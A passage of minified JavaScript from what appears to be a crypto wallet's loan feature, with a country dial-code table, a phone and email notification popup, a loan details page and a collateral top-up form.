"eu-union", "baltic"], "pl", "48", "...-...-..."], ["Portugal", ["europe", "eu-union"], "pt", "351"], ["Puerto Rico", ["america", "carribean"], "pr", "1", "", 3, ["787", "939"]], ["Qatar", ["middle-east"], "qa", "974"], ["Réunion", ["africa"], "re", "262"], ["Romania", ["europe", "eu-union"], "ro", "40"], ["Russia", ["europe", "asia", "ex-ussr", "baltic"], "ru", "7", "(...) ...-..-..", 0], ["Rwanda", ["africa"], "rw", "250"], ["Saint Kitts and Nevis", ["america", "carribean"], "kn", "1869"], ["Saint Lucia", ["america", "carribean"], "lc", "1758"], ["Saint Vincent and the Grenadines", ["america", "carribean"], "vc", "1784"], ["Samoa", ["oceania"], "ws", "685"], ["San Marino", ["europe"], "sm", "378"], ["São Tomé and Príncipe", ["africa"], "st", "239"], ["Saudi Arabia", ["middle-east"], "sa", "966"], ["Senegal", ["africa"], "sn", "221"], ["Serbia", ["europe", "ex-yugos"], "rs", "381"], ["Seychelles", ["africa"], "sc", "248"], ["Sierra Leone", ["africa"], "sl", "232"], ["Singapore", ["asia"], "sg", "65", "....-...."], ["Slovakia", ["europe", "eu-union"], "sk", "421"], ["Slovenia", ["europe", "eu-union", "ex-yugos"], "si", "386"], ["Solomon Islands", ["oceania"], "sb", "677"], ["Somalia", ["africa"], "so", "252"], ["South Africa", ["africa"], "za", "27"], ["South Korea", ["asia"], "kr", "82", "... .... ...."], ["South Sudan", ["africa", "north-africa"], "ss", "211"], ["Spain", ["europe", "eu-union"], "es", "34", "... ... ..."], ["Sri Lanka", ["asia"], "lk", "94"], ["Sudan", ["africa"], "sd", "249"], ["Suriname", ["america", "south-america"], "sr", "597"], ["Swaziland", ["africa"], "sz", "268"], ["Sweden", ["europe", "eu-union", "baltic"], "se", "46", "(...) ...-..."], ["Switzerland", ["europe"], "ch", "41", ".. ... .. .."], ["Syria", ["middle-east"], "sy", "963"], ["Taiwan", ["asia"], "tw", "886"], ["Tajikistan", ["asia", "ex-ussr"], "tj", "992"], ["Tanzania", ["africa"], "tz", "255"], ["Thailand", ["asia"], "th", "66"], ["Timor-Leste", ["asia"], "tl", "670"], ["Togo", ["africa"], "tg", "228"], ["Tonga", ["oceania"], "to", "676"], ["Trinidad and Tobago", ["america", "carribean"], "tt", "1868"], ["Tunisia", ["africa", "north-africa"], "tn", "216"], ["Turkey", ["europe"], "tr", "90", "... ... .. .."], ["Turkmenistan", ["asia", "ex-ussr"], "tm", "993"], ["Tuvalu", ["asia"], "tv", "688"], ["Uganda", ["africa"], "ug", "256"], ["Ukraine", ["europe", "ex-ussr"], "ua", "380", "(..) ... .. .."], ["United Arab Emirates", ["middle-east"], "ae", "971"], ["United Kingdom", ["europe", "eu-union"], "gb", "44", ".... ......"], ["United States", ["america", "north-america"], "us", "1", "(...) ...-....", 0, ["907", "205", "251", "256", "334", "479", "501", "870", "480", "520", "602", "623", "928", "209", "213", "310", "323", "408", "415", "510", "530", "559", "562", "619", "626", "650", "661", "707", "714", "760", "805", "818", "831", "858", "909", "916", "925", "949", "951", "303", "719", "970", "203", "860", "202", "302", "239", "305", "321", "352", "386", "407", "561", "727", "772", "813", "850", "863", "904", "941", "954", "229", "404", "478", "706", "770", "912", "808", "319", "515", "563", "641", "712", "208", "217", "309", "312", "618", "630", "708", "773", "815", "847", "219", "260", "317", "574", "765", "812", "316", "620", "785", "913", "270", "502", "606", "859", "225", "318", "337", "504", "985", "413", "508", "617", "781", "978", "301", "410", "207", "231", "248", "269", "313", "517", "586", "616", "734", "810", "906", "989", "218", "320", "507", "612", "651", "763", "952", "314", "417", "573", "636", "660", "816", "228", "601", "662", "406", "252", "336", "704", "828", "910", "919", "701", "308", "402", "603", "201", "609", "732", "856", "908", "973", "505", "575", "702", "775", "212", "315", "516", "518", "585", "607", "631", "716", "718", "845", "914", "216", "330", "419", "440", "513", "614", "740", "937", "405", "580", "918", "503", "541", "215", "412", "570", "610", "717", "724", "814", "401", "803", "843", "864", "605", "423", "615", "731", "865", "901", "931", "210", "214", "254", "281", "325", "361", "409", "432", "512", "713", "806", "817", "830", "903", "915", "936", "940", "956", "972", "979", "435", "801", "276", "434", "540", "703", "757", "804", "802", "206", "253", "360", "425", "509", "262", "414", "608", "715", "920", "304", "307"]], ["Uruguay", ["america", "south-america"], "uy", "598"], ["Uzbekistan", ["asia", "ex-ussr"], "uz", "998"], ["Vanuatu", ["oceania"], "vu", "678"], ["Vatican City", ["europe"], "va", "39", ".. .... ....", 1], ["Venezuela", ["america", "south-america"], "ve", "58"], ["Vietnam", ["asia"], "vn", "84"], ["Yemen", ["middle-east"], "ye", "967"], ["Zambia", ["africa"], "zm", "260"], ["Zimbabwe", ["africa"], "zw", "263"]]
          , l7 = undefined
          , s7 = [{
            countryName: "Bangladesh",
            internationalDialCode: "+880"
        }, {
            countryName: "China",
            internationalDialCode: "+86"
        }, {
            countryName: "Iran",
            internationalDialCode: "+98"
        }, {
            countryName: "Iraq",
            internationalDialCode: "+964"
        }, {
            countryName: "North Korea",
            internationalDialCode: "+850"
        }, {
            countryName: "South Korea",
            internationalDialCode: "+82"
        }, {
            countryName: "Kuwait",
            internationalDialCode: "+965"
        }, {
            countryName: "Lebanon",
            internationalDialCode: "+961"
        }, {
            countryName: "Pakistan",
            internationalDialCode: "+92"
        }, {
            countryName: "Congo",
            internationalDialCode: "+242"
        }, {
            countryName: "Congo",
            internationalDialCode: "+243"
        }, {
            countryName: "Liberia",
            internationalDialCode: "+231"
        }, {
            countryName: "Sierra Leone",
            internationalDialCode: "+232"
        }, {
            countryName: "Somalia",
            internationalDialCode: "+252"
        }, {
            countryName: "South Sudan",
            internationalDialCode: "+211"
        }, {
            countryName: "Sudan",
            internationalDialCode: "+249"
        }];
        function SelectCountries(e) {
            const t = undefined
              , a = r7.map((e => ({
                countryName: e[0],
                regions: e[1],
                code: e[2],
                internationalDialCode: `+${e[3]}`,
                format: e[4],
                priorityOrder: e[5],
                areaCodes: e[6]
            }))).filter((e => !s7.find((t => t.countryName === e.countryName && t.internationalDialCode === e.internationalDialCode))));
            return O.createElement(O.Fragment, null, O.createElement(a7, {
                selected: e.country,
                items: a,
                placeholder: "Country",
                emptyPlaceholder: "Unfortunately, this feature is not available for your country.",
                onChange: e.onChange
            }))
        }
        SelectCountries.propTypes = {
            onChange: as().func,
            country: as().object
        };
        const i7 = /^\d+$/;
        function PopupEditPhone(e) {
            const [t,a] = (0,
            O.useState)("")
              , [n,r] = (0,
            O.useState)("")
              , [l,s] = (0,
            O.useState)("")
              , [i,o] = (0,
            O.useState)({})
              , c = (0,
            O.useRef)(null)
              , u = O.createRef()
              , d = O.createRef()
              , [m,p] = (0,
            O.useState)(!1)
              , f = (0,
            $.I0)();
            function handleInputPhone(e) {
                let {target: {value: t}} = e;
                const a = t.slice(null == l ? void 0 : l.length).replace(/-/g, "").replace(/\s/g, "");
                (i7.test(a) || "" === a) && r(a)
            }
            function handleInputEmail(e) {
                let {target: {value: t}} = e;
                a(t)
            }
            async function handleSavePhone() {
                var a, r, s, i;
                const {isValid: o} = null !== (a = null === (r = u.current) || void 0 === r ? void 0 : r.validate()) && void 0 !== a ? a : {}
                  , {isValid: c} = null !== (s = null === (i = d.current) || void 0 === i ? void 0 : i.validate()) && void 0 !== s ? s : {};
                if (!o || !c) {
                    p(!0);
                    return
                }
                const m = `${l.replace("+", "")}${n}`;
                if (n.length > 0 && l.length > 0) {
                    cc.$.send(cc.d.BORROW_SUBSCRIBE);
                    await f(updateUserLoanCredentials({
                        subscribe_phone: m,
                        subscribe_email: t
                    }));
                    const {loan: {currency: a}, deposit: {currency: n}} = e.loan;
                    ge.b.success(ge.d.LOAN_ADD_PHONE_SUCCESS, {
                        collateralCurrency: n,
                        borrowCurrency: a
                    });
                    await f(fetchUserLoans());
                    e.onClose()
                }
            }
            function handleSetCountry(e) {
                var t;
                o(e);
                s(e.internationalDialCode);
                p(!1);
                null === (t = c.current) || void 0 === t || t.focus()
            }
            return O.createElement(aa, {
                visible: e.visible,
                width: 590,
                onClose: e.onClose,
                className: P8
            }, O.createElement("div", {
                className: L8
            }, O.createElement("div", {
                className: F8
            }, "Edit Contact")), O.createElement("div", {
                className: W8
            }, !e.loan.user.phone && O.createElement("p", null, "Please add your phone number to recieve notifications when your loan is at risk. No spam."), e.loan.user.phone && O.createElement("p", null, "Add your new phone number where you want to receive notifications when your loan is at risk."), e.loan.user.phone && O.createElement("p", {
                className: R8
            }, "+", e.loan.user.phone), O.createElement(sf(), {
                ref: u
            }, O.createElement("div", {
                className: O8
            }, O.createElement(lf.ValidatorField, {
                rules: zf.phoneNumber,
                value: {
                    countryCode: l,
                    phone: n
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isSelect: !0,
                    isInvalid: !t && m,
                    message: a,
                    className: M8
                }, O.createElement(SelectCountries, {
                    onChange: handleSetCountry,
                    country: i
                }), O.createElement(Ea, {
                    className: D8,
                    ref: c,
                    value: l || n ? `${l} ${n}` : "",
                    placeholder: "Enter phone number",
                    onChange: handleInputPhone
                }))
            }
            )))), O.createElement(sf(), {
                ref: d
            }, O.createElement("div", {
                className: O8
            }, O.createElement(lf.ValidatorField, {
                rules: zf.email,
                value: t
            }, (e => {
                let {isValid: a, message: n} = e;
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isSelect: !0,
                    isInvalid: !a && m,
                    message: n,
                    className: M8
                }, O.createElement(Ea, {
                    className: D8,
                    value: t || "",
                    placeholder: "Enter email",
                    onChange: handleInputEmail
                }))
            }
            )))), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleSavePhone,
                className: B8
            }, "Save")))
        }
        const o7 = a.p + "048a3179b5585378361f0fdce94c1734.svg"
          , c7 = a.p + "dbc4e8ad24c284c04c26cac6fc396584.svg"
          , u7 = "BorrowViewPage_wrapperLoanInfo_1ld3Y"
          , d7 = "BorrowViewPage_loanInfoRow_3tVXm"
          , m7 = "BorrowViewPage_rateChange_2Ux6Y"
          , p7 = "BorrowViewPage_loanInfoButton_11rwN"
          , f7 = "BorrowViewPage_wrapperCurrency_HoLz9"
          , E7 = "BorrowViewPage_loanPriceWrapper_18_Mn"
          , h7 = "BorrowViewPage_loanAmountPrice_1W1rR"
          , g7 = "BorrowViewPage_loanAmountCurrency_3PRD-"
          , y7 = "BorrowViewPage_green_2nin2"
          , v7 = "BorrowViewPage_legend_3n1hf"
          , _7 = "BorrowViewPage_collateralLegend_glbzV"
          , w7 = "BorrowViewPage_loanLegend_23ztL"
          , b7 = "BorrowViewPage_borrowChart_5C8D2"
          , k7 = "BorrowViewPage_borrowChartElectron_2MvCB"
          , S7 = "BorrowViewPage_smallLoader_2Z0rd"
          , C7 = "BorrowViewPage_tooltipInfo_3WzXd"
          , N7 = "BorrowViewPage_iconInfo_xSWkB"
          , T7 = "BorrowViewPage_backButton_3Xutt"
          , A7 = "BorrowViewPage_borrowBorderContainer_1bnYM"
          , x7 = "BorrowViewPage_titleHeader_19jR2"
          , I7 = "BorrowViewPage_userSelect_ewgbc"
          , P7 = "BorrowViewPage_boardChart_2cBC-";
        var L7 = a(6556);
        const BorrowViewPage = () => {
            var e, t, a, n, r, l, s, i, o, c;
            const u = (0,
            j.k6)()
              , d = (0,
            j.$B)()
              , [m,p] = (0,
            O.useState)(!1)
              , f = (0,
            $.v9)(L3)
              , {localCurrency: E} = local_currency_useLocalCurrency()
              , [h,g] = (0,
            O.useState)(null)
              , y = f(d.params.loanId || "")
              , v = (0,
            Ko.Lq)((null == y || null === (e = y.repayment) || void 0 === e ? void 0 : e.amount) || 0, 6)
              , _ = (0,
            $.v9)(x3)
              , w = (0,
            $.v9)(kd.Y2)
              , b = {
                currency: (null == y || null === (t = y.deposit.currency) || void 0 === t ? void 0 : t.toLowerCase()) || "",
                family: (null == y || null === (a = y.deposit.currency_network) || void 0 === a ? void 0 : a.toLowerCase()) || "",
                smartContract: (null == y || null === (n = y.deposit.smartContract) || void 0 === n ? void 0 : n.toLowerCase()) || ""
            };
            function handlePayOff() {
                u.push((0,
                M.RU)(`/borrow/pay-off/${null == y ? void 0 : y.loan_id}`))
            }
            function handleTopUp() {
                u.push((0,
                M.RU)(`/borrow/top-up/${null == y ? void 0 : y.loan_id}`))
            }
            function handleEditClick(e) {
                e.preventDefault();
                e.stopPropagation();
                p(!0)
            }
            (0,
            O.useEffect)(( () => {
                var e;
                if (!y)
                    return;
                const t = null == _ || null === (e = _.deposit) || void 0 === e ? void 0 : e.find((e => (0,
                Ho.t)(e.currency) === (0,
                Ho.t)(y.deposit.currency)));
                t && g(t.additional_fees)
            }
            ), [y, _]);
            const k = (0,
            Cd.w)(w, {
                currency: (null == y ? void 0 : y.deposit.currency) || "",
                family: null == y ? void 0 : y.deposit.currency_network
            })
              , S = null == k ? void 0 : k.rates[E]
              , C = (0,
            Ko.G)(S, (0,
            Ko.$q)(null == y ? void 0 : y.liquidation_price, 1.1))
              , N = ["new", "confirmed", "deposit_received", "transaction_sent", "pledge_redeemed", "pledge_transaction_sent"].includes((null == y ? void 0 : y.status) || "")
              , T = ["closed", "loan_failed", "liquidated"].includes((null == y ? void 0 : y.status) || "")
              , A = `The amount required for returning your collateral. It consists of the loan amount, the interest rate for the period of your loan (accrued every month), an additional fee of $${h} for loans less than 30 days.`
              , x = "Will be returned after the loan is repaid. Top up the collateral to avoid liquidation if the price down limit is close (the price down limit will be reduced, an additional loan won't be provided)."
              , I = "The market price of the collateral currency at which your collateral will be automatically sold."
              , P = BorrowPage_utils_patchBorrowCurrency((null == y || null === (r = y.loan) || void 0 === r ? void 0 : r.currency) || "")
              , L = BorrowPage_utils_patchBorrowCurrency((null == y || null === (l = y.loan) || void 0 === l ? void 0 : l.currency_network) || "")
              , F = BorrowPage_utils_patchBorrowCurrency((null == y || null === (s = y.repayment) || void 0 === s ? void 0 : s.currency) || "")
              , W = (0,
            L7.Z)((null == y ? void 0 : y.repayment.currency_network) || "");
            return O.createElement(O.Fragment, null, y && O.createElement(PopupEditPhone, {
                visible: m,
                onClose: () => p(!1),
                loan: y
            }), O.createElement("div", {
                className: "col-xs-7"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, A7)
            }, O.createElement(BackButton, {
                to: "/app/borrow",
                className: T7,
                color: "gray"
            }), O.createElement("h1", {
                className: x7
            }, P ? O.createElement(O.Fragment, null, P.toUpperCase(), " loan") : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                className: u7
            }, O.createElement("div", {
                className: d7
            }, P && O.createElement("div", {
                className: f7
            }, O.createElement(IconCurrency, {
                currency: P
            })), O.createElement("div", {
                className: E7
            }, O.createElement("h4", null, "Loan amount"), O.createElement("span", {
                className: Ht()(h7, I7)
            }, y ? O.createElement(O.Fragment, null, (0,
            Ko.FH)(y.loan.amount || y.loan.expected_amount, {
                max: 5
            })) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                className: g7
            }, P ? O.createElement(O.Fragment, null, " ", P.toUpperCase(), "/", L) : O.createElement(LoaderDots, {
                visible: !0
            })))), O.createElement("div", {
                className: d7
            }, O.createElement("div", {
                className: f7
            }, O.createElement(IconCurrency, {
                currency: F
            })), O.createElement("div", {
                className: E7
            }, O.createElement("h4", null, "Repayment", O.createElement(tooltip, {
                classNameWrapper: C7,
                text: A,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: N7
            }))), O.createElement("span", {
                className: Ht()(h7, I7)
            }, y ? O.createElement(O.Fragment, null, v) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                className: g7
            }, F.toUpperCase(), "/", W)), !T && O.createElement(Yl, {
                size: "big",
                color: "blue",
                className: p7,
                onClick: handlePayOff,
                disabled: N,
                id: "borrowDetailsPayOff"
            }, "Pay off loan")), O.createElement("div", {
                className: d7
            }, O.createElement("div", {
                className: f7
            }, y ? O.createElement(IconCurrency, {
                currency: y.deposit.currency
            }) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                className: E7
            }, O.createElement("h4", null, "Collateral", O.createElement(tooltip, {
                classNameWrapper: C7,
                text: x,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: N7
            }))), O.createElement("span", {
                className: Ht()(h7, I7)
            }, y ? O.createElement(O.Fragment, null, y.deposit.amount || y.deposit.expected_amount) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                className: g7
            }, y ? O.createElement(O.Fragment, null, y.deposit.currency.toUpperCase()) : O.createElement(LoaderDots, {
                visible: !0
            }))), !T && O.createElement(Yl, {
                size: "big",
                color: "blue",
                className: p7,
                onClick: handleTopUp,
                disabled: N,
                id: "borrowDetailsTopUp"
            }, "Top Up")), O.createElement("div", {
                className: d7
            }, O.createElement("div", {
                className: f7
            }, O.createElement("img", {
                src: C ? c7 : o7,
                alt: ""
            })), O.createElement("div", {
                className: E7
            }, O.createElement("h4", null, "Price down limit", O.createElement(tooltip, {
                classNameWrapper: C7,
                text: I,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: N7
            }))), O.createElement("span", {
                className: Ht()(h7, I7)
            }, y ? O.createElement(O.Fragment, null, (0,
            Ko.yF)(y.liquidation_price, {
                max: 5
            })) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                className: g7
            }, y ? O.createElement(O.Fragment, null, y.deposit.currency.toUpperCase(), "/", P.toUpperCase()) : O.createElement(LoaderDots, {
                visible: !0
            }))))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Status:"), O.createElement(misk_info_modern_MiskInfoValue, null, y ? O.createElement("b", null, getBorrowHumanStatus(y.status)) : O.createElement(LoaderDots, {
                visible: !0
            }), N && O.createElement(loader, {
                visible: !0,
                width: 18,
                className: S7
            }))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Date:"), O.createElement(misk_info_modern_MiskInfoValue, null, y ? O.createElement("b", null, date_format(y.created_at, "mmm dd, yyyy, hh:MMtt")) : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Loan ID:"), O.createElement(misk_info_modern_MiskInfoValue, null, y ? O.createElement("b", {
                className: I7
            }, y.loan_id) : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "APR:"), O.createElement(misk_info_modern_MiskInfoValue, null, y ? O.createElement(O.Fragment, null, O.createElement("b", null, y.interest_percent, "% (", (0,
            Ko.FH)(y.interest_amounts.year, {
                max: 5
            })), " ", P.toUpperCase(), ")") : O.createElement(LoaderDots, {
                visible: !0
            }))), y && O.createElement(O.Fragment, null, (null == y || null === (i = y.user) || void 0 === i ? void 0 : i.email) && O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Subscription:"), O.createElement(misk_info_modern_MiskInfoValue, null, O.createElement("b", null, y.user.email, " ", O.createElement("a", null, "Edit")), " ")), (null == y || null === (o = y.user) || void 0 === o ? void 0 : o.phone) && O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Subscription:"), O.createElement(misk_info_modern_MiskInfoValue, null, O.createElement("b", null, "+", y.user.phone, " ", O.createElement("a", {
                onClick: handleEditClick
            }, "Edit")), " ")), !(null != y && null !== (c = y.user) && void 0 !== c && c.phone) && O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null), O.createElement(misk_info_modern_MiskInfoValue, null, O.createElement("p", null, "Sing up for notifications about the risks of loan ", O.createElement("br", null), " liquidation by phone. No spam."), O.createElement("b", null, O.createElement("a", {
                onClick: handleEditClick
            }, "+ add phone or email"))))))), O.createElement("div", {
                className: "col-xs-5"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, b7, {
                    [k7]: (0,
                    M.d)()
                })
            }, O.createElement(EChartProvider, null, O.createElement(EChart, {
                walletChartData: b,
                isSmallChart: !0
            })))))
        }
          , F7 = "popup-success_popup_22kMl"
          , W7 = "popup-success_header_1hd1w"
          , R7 = "popup-success_headerSubTitle_1nKyT"
          , B7 = "popup-success_headerTitle_1LO69"
          , O7 = "popup-success_iconSuccess_10odC"
          , D7 = "popup-success_currecniesPairs_28M64"
          , M7 = "popup-success_currencyBlock_iLsaC"
          , U7 = "popup-success_currencySeparator_Nx3iA"
          , G7 = "popup-success_body_3vki_"
          , V7 = "popup-success_bottomButton_7lL4D"
          , K7 = "popup-success_currencyTicker_3yd2j"
          , H7 = "popup-success_currencyAmountGreen_2gdMt"
          , z7 = "popup-success_currencyAmount_1Hz9B";
        function popup_success_PopupLoanSuccess(e) {
            return O.createElement(aa, {
                visible: e.visible,
                width: 370,
                onClose: e.onClose,
                className: F7
            }, O.createElement("div", {
                className: W7
            }, O.createElement("div", {
                className: R7
            }, "Collateral has been sent"), O.createElement("div", {
                className: B7
            }, "Success!"), O.createElement("div", {
                className: O7
            })), O.createElement("div", {
                className: G7
            }, O.createElement("p", null, "Your price down limit was increased."), O.createElement("div", {
                className: D7
            }, O.createElement("div", {
                className: M7
            }, O.createElement(IconCurrency, {
                currency: e.data.currencyFrom
            }), O.createElement("span", {
                className: z7
            }, "- ", e.data.amountFrom), O.createElement("span", {
                className: K7
            }, (0,
            be.xG)(e.data.currencyFrom))))), O.createElement("div", {
                className: V7,
                onClick: e.onClose
            }, "OK"))
        }
        const j7 = "BoardTopUpPage_row_3TeDK"
          , $7 = "BoardTopUpPage_headerBlock_pxmW2"
          , Z7 = "BoardTopUpPage_header_28NGv"
          , Y7 = "BoardTopUpPage_emptyHeaderDiv_3pYfD"
          , q7 = "BoardTopUpPage_separatorTitle__QYMW"
          , X7 = "BoardTopUpPage_separatorButton_3tNGe"
          , Q7 = "BoardTopUpPage_inputError_uyzNG"
          , J7 = "BoardTopUpPage_walletInput_1Vdx0"
          , eee = "BoardTopUpPage_inputWrapperClassName_2tSNk"
          , tee = "BoardTopUpPage_userSelect_1SxFu"
          , aee = "BoardTopUpPage_clearBottomMargin_2VEoG"
          , nee = "BoardTopUpPage_miskInfoTitle_nUPHG"
          , ree = "BoardTopUpPage_boardChartLoader_31mn1";
        function ChartLoader(e) {
            let {className: t} = e;
            const a = (0,
            $.v9)(Ot);
            return O.createElement(O.Fragment, null, a && (0,
            M.d)() ? O.createElement("img", {
                className: t,
                src: "dark" === a ? m4 : p4,
                alt: "Not available at the moment"
            }) : O.createElement("img", {
                className: t,
                src: "dark" === a ? f4 : E4,
                alt: "Not available at the moment"
            }))
        }
        const BoardTopUpPage = () => {
            var e, t, a, n, r;
            const l = (0,
            j.$B)()
              , s = (0,
            $.I0)()
              , [i,o] = (0,
            O.useState)("")
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)({})
              , [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)(null)
              , [w,b] = (0,
            O.useState)(null)
              , [k,S] = (0,
            O.useState)(!1)
              , C = (0,
            O.useRef)()
              , N = undefined
              , T = (0,
            $.v9)(L3)(String(l.params.loanId))
              , A = (0,
            $.v9)($c)
              , [x] = use_fee(null != w ? w : void 0, null != w ? w : void 0, i)
              , [I] = fee_wallet(null != w ? w : void 0)
              , {convertToFiat: P, convertToCrypto: L} = useConverter()
              , [F,W] = (0,
            O.useState)(!1)
              , R = (0,
            O.useRef)()
              , [B] = usePrecision(null != w ? w : void 0)
              , {localCurrency: D} = local_currency_useLocalCurrency()
              , [M,U] = (0,
            O.useState)("")
              , G = (0,
            O.useCallback)((e => {
                var t;
                return e.currency === (0,
                Ho.t)(null == T || null === (t = T.deposit) || void 0 === t ? void 0 : t.currency) && !e.isWatchOnly && !e.isHw
            }
            ), [null == T || null === (e = T.deposit) || void 0 === e ? void 0 : e.currency]);
            function handleChangeValueFrom(e) {
                o(e);
                W(!0)
            }
            function handleMinTopUp() {
                if (x && M) {
                    Number(M) > Number(x) ? o((0,
                    Ko.FH)(M, {
                        max: B
                    })) : o(x.toString());
                    W(!0)
                }
            }
            function handleSetAllAmount() {
                var e;
                o(null !== (e = null == w ? void 0 : w.balance) && void 0 !== e ? e : "");
                W(!0)
            }
            (0,
            O.useEffect)(( () => {
                if (w) {
                    const e = L(200, w, "usd");
                    if (e) {
                        U(e);
                        o((0,
                        Ko.$q)(e, 2).toString())
                    }
                }
            }
            ), [w]);
            (0,
            O.useEffect)(( () => {
                const e = A.filter(G)
                  , t = A.reduce(( (e, t) => e.concat(t.subWallets.filter(G))), []).filter((e => {
                    var t;
                    return (0,
                    Ho.t)(e.currency) === (0,
                    Ho.t)(null == T || null === (t = T.deposit) || void 0 === t ? void 0 : t.currency)
                }
                ));
                !w && e[0] && b(e[0]);
                if (!w && !e[0] && t[0]) {
                    b(t[0]);
                    S(!0)
                }
            }
            ), [A, T, G, w]);
            (0,
            O.useEffect)(( () => {
                async function fetch() {
                    window.clearTimeout(C.current);
                    C.current = window.setTimeout((async () => {
                        if (null != T && T.loan_id) {
                            const t = await s(calculateNewDownPrice(null == T ? void 0 : T.loan_id, i));
                            if ("liquidation_price"in t) {
                                var e;
                                y(null == t || null === (e = t.liquidation_price) || void 0 === e ? void 0 : e.toString())
                            }
                            t.deposit.new_amount && _(t.deposit.new_amount)
                        }
                    }
                    ), 100)
                }
                T && fetch()
            }
            ), [i, null == T ? void 0 : T.loan_id, T, s]);
            const V = {
                collateralCurrency: null == T || null === (t = T.deposit) || void 0 === t ? void 0 : t.currency,
                borrowCurrency: null == T || null === (a = T.loan) || void 0 === a ? void 0 : a.currency
            };
            async function handleTopUp() {
                var e, t;
                const {isValid: a} = null !== (e = null === (t = R.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {};
                if (!a) {
                    W(!0);
                    setTimeout(( () => W(!1)), 3e3);
                    return
                }
                m(!0);
                const {address: n, extraId: r} = await s(createIncreseDeposit(String(l.params.loanId), i))
                  , o = {
                    currency: null == w ? void 0 : w.currency,
                    address: n
                };
                try {
                    const e = await tM.send("send", w, o, I, {
                        amount: (0,
                        Ko.PD)(i, x),
                        isFeeIncluded: !1,
                        fee: x,
                        extraId: r
                    });
                    if (e.error) {
                        var c;
                        cc.$.send(cc.d.BORROW_LOAN_TOP_UP_ERROR);
                        ge.b.error(ge.d.LOAN_TOPUP_FAILED, V);
                        u((null === (c = e.error) || void 0 === c ? void 0 : c.text) || e.error);
                        m(!1);
                        return
                    }
                    if (e.hash) {
                        cc.$.send(cc.d.BORROW_LOAN_TOP_UP_DONE);
                        ge.b.success(ge.d.LOAN_TOPUP_SUCCESS, V);
                        h({
                            currencyFrom: null == w ? void 0 : w.currency,
                            amountFrom: i
                        });
                        f(!0)
                    }
                } catch (e) {
                    cc.$.send(cc.d.BORROW_LOAN_TOP_UP_ERROR);
                    ge.b.error(ge.d.LOAN_TOPUP_FAILED, V);
                    u(e.message)
                }
                m(!1)
            }
            const K = {
                available: (null == w ? void 0 : w.balance) || "0",
                min: M,
                max: Math.min(Number(null == w ? void 0 : w.balance), null != v ? v : NaN),
                precision: B
            }
              , H = BorrowPage_utils_patchBorrowCurrency((null == T || null === (n = T.loan) || void 0 === n ? void 0 : n.currency) || "");
            return O.createElement(sf(), {
                ref: R
            }, O.createElement(popup_success_PopupLoanSuccess, {
                visible: p,
                onClose: () => f(!1),
                data: E
            }), O.createElement("div", {
                className: "col-xs-7"
            }, O.createElement("div", {
                className: X5.borrowBorderContainer
            }, O.createElement("div", {
                className: $7
            }, O.createElement(BackButton, {
                color: "gray"
            }), O.createElement("h1", {
                className: Z7
            }, "Top up collateral"), O.createElement("div", {
                className: Y7
            })), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: i,
                rules: [...zf.amount(K)]
            }, (e => {
                var t;
                let {isValid: a, message: n} = e;
                return O.createElement(O.Fragment, null, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "Your Collateral",
                    onChange: handleChangeValueFrom,
                    value: i,
                    disabled: d,
                    isInvalid: !a && F,
                    fiat: w ? w.currency : void 0,
                    customWrapper: aee
                }, O.createElement("div", {
                    className: J7
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    inputWrapperClassName: eee,
                    selectedWallet: null != w ? w : void 0,
                    onChange: b,
                    wallets: A,
                    customFilter: e => onCustomFilterWallets(e, [(null == w ? void 0 : w.currency) || ""]),
                    newArrow: !0,
                    withArrowWhenDisabled: !0,
                    emptyPlaceholder: `You can select only ${null == w || null === (t = w.currency) || void 0 === t ? void 0 : t.toUpperCase()} here`,
                    isDisabledParentWallet: k,
                    isSelectFirstSubwallet: k,
                    notSelectParentWallet: k
                })), !a && F ? O.createElement("div", {
                    className: Q7
                }, n) : null), O.createElement(MiniTabSelector, null, O.createElement("span", {
                    onClick: handleMinTopUp
                }, "Min"), O.createElement("span", {
                    onClick: handleSetAllAmount
                }, "All")))
            }
            )), O.createElement(lf.ValidatorField, {
                value: w,
                rules: zf.wallet
            }, (e => O.createElement(O.Fragment, null, !e.isValid && F && O.createElement("div", {
                className: Q7
            }, e.message))))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, {
                className: nee
            }, "Price down limit:"), O.createElement(misk_info_modern_MiskInfoValue, null, O.createElement("b", {
                className: tee
            }, T && g ? O.createElement(O.Fragment, null, g, " ", (0,
